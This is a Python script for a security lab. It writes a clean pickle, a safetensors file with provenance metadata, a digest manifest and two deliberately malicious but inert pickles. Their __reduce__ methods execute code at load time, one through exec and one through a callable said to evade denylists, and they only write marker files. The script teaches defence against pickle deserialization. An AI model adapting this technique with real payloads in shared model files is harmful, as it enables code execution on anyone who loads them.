"""Write the lab's model artifacts: one clean pickle, two inert malicious
pickles, a safetensors file with provenance metadata, and the digest
manifest recorded when the artifacts were approved.

The two malicious pickles are inert by design: their only effect when
loaded is to write a marker file (PWNED-exec or PWNED-sneaky) into the
working directory, which is how the lab shows that loading ran code.
They never touch anything else. Requires numpy and safetensors:

    python make_models.py
"""
import hashlib
import pathlib
import pickle
import sys

try:
    import numpy as np
    from safetensors.numpy import save_file
except ImportError:
    sys.exit("make_models.py needs numpy and safetensors: pip install numpy safetensors")

OUT = pathlib.Path("models")


class ExecPayload:
    """Calls builtins.exec - the kind of import every denylist names."""

    def __reduce__(self):
        return (exec, ("open('PWNED-exec', 'w').write('code ran at load')",))


class SneakyPayload:
    """Calls pathlib.Path.write_text - a callable no denylist names."""

    def __reduce__(self):
        return (pathlib.Path.write_text, (pathlib.Path("PWNED-sneaky"), "code ran at load"))


def main():
    OUT.mkdir(exist_ok=True)
    weights = {"w": np.arange(6, dtype=np.float32).reshape(2, 3)}

    with open(OUT / "clean.pkl", "wb") as fh:
        pickle.dump(weights, fh)
    with open(OUT / "exec.pkl", "wb") as fh:
        pickle.dump({"w": weights["w"], "extra": ExecPayload()}, fh)
    with open(OUT / "sneaky.pkl", "wb") as fh:
        pickle.dump({"w": weights["w"], "extra": SneakyPayload()}, fh)

    # Provenance travels inside the file: safetensors metadata is a
    # string-to-string map stored in the JSON header.
    save_file(weights, str(OUT / "model.safetensors"), metadata={
        "source": "lab/example-model",
        "revision": "0123456789abcdef0123456789abcdef01234567",
        "license": "apache-2.0",
    })

    # The manifest records the approved artifacts only: the malicious
    # pickles are what the scanners are for, not what a release ships.
    lines = []
    for name in ("model.safetensors", "clean.pkl"):
        digest = hashlib.sha256((OUT / name).read_bytes()).hexdigest()
        lines.append(f"{digest}  models/{name}\n")
    pathlib.Path("models.sha256").write_text("".join(lines))
    print(f"wrote {len(list(OUT.iterdir()))} files to {OUT}/ and models.sha256")


if __name__ == "__main__":
    main()
